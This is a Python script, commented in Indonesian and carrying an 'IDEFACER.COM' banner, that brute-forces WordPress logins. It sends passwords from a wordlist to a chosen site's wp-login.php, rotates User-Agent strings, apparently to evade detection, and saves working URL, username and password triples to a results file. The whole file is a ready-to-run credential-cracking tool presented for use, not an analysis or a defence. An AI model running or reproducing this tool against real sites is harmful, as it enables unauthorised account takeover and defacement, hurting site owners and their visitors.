import requests
from bs4 import BeautifulSoup
from multiprocessing import Pool
import sys
import random
import time

# List berbagai User-Agent yang mungkin
user_agents = [
    'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1 Edg/120.0.0.0',
    'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36',
]

def get_random_user_agent():
    return random.choice(user_agents)

def login(site, session, username, password):
    try:
        url = f'{site}/wp-login.php'
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'content-type': 'application/x-www-form-urlencoded',
            'cookie': 'wordpress_test_cookie=WP%20Cookie%20check',
            'origin': site,
            'referer': f'{url}?redirect_to={site}/wp-admin/&reauth=1',
            'user-agent': get_random_user_agent(),  # Menggunakan User-Agent acak
            'Connection': 'keep-alive'
        }

        data = {
            'log': username,
            'pwd': password,
            'wp-submit': 'Log+In',
            'redirect_to': f'{site}/wp-admin/',
            'testcookie': '1'
        }

        response = session.post(url, headers=headers, data=data, allow_redirects=False)

        if response.status_code == 302 and '/wp-admin/' in response.headers.get('Location', ''):
            soup = BeautifulSoup(response.content, 'html.parser')
            elem = soup.select_one('li#wp-admin-bar-menu-toggle')

            received_cookie = response.headers.get('Set-Cookie', '')
            print(f"Received Cookie")

            with open("result.txt", "a") as result_file:
                result_file.write(f'{site}/wp-login.php|{username}|{password}\n')
            print(f"\033[32m{site} < Successfully >\033[0m")
            return True
        else:
            print(f"\033[31m{site} [Failed]\033[0m")
    except Exception as e:
        print(f"\033[31m{site} [x]\033[0m")

def process_site(site, username, passwords):
    with requests.Session() as session:
        for password in passwords:
            if login(site.strip(), session, username.strip(), password.strip()):
                return True
        return False
    # Contoh banner IDEFACER.COM
banner = """
  ___ ____  _____ _____ _    ____ _____ ____    ____ ___  __  __ 
|_ _|  _ \| ____|  ___/ \  / ___| ____|  _ \  / ___/ _ \|  \/  |
 | || | | |  _| | |_ / _ \| |   |  _| | |_) || |  | | | | |\/| |
 | || |_| | |___|  _/ ___ \ |___| |___|  _ < | |__| |_| | |  | |
|___|____/|_____|_|/_/   \_\____|_____|_| \_(_)____\___/|_|  |_|
                    https://idefacer.com/
"""

print(banner)

if __name__ == '__main__':
    try:
        site = input("URL website ( https://domain.com )  -> ").strip()
        username = input("Username -> ").strip()
        file_passwords = input("List passwords -> ").strip()
        print(f"\033[33m!! akan masuk ke result.txt !!")

        with open(file_passwords, "r") as file_content:
            passwords = file_content.readlines()

        success_count = 0
        failed_count = 0

        try:
            pool = Pool(processes=20)
            results = pool.starmap(process_site, [(site, username, passwords)])
            pool.close()
            pool.join()

            success_count = sum(results)
            failed_count = len(results) - success_count

            print(f"\nTotal Success: {success_count}")
            print(f"Total Failed: {failed_count}")

        except Exception as e:
            print(f"Error")
    except FileNotFoundError:
        print("File tidak ditemukan. Pastikan nama file dan path yang benar.")
    except KeyboardInterrupt:
        print("\nDiberhentikan oleh pengguna.")
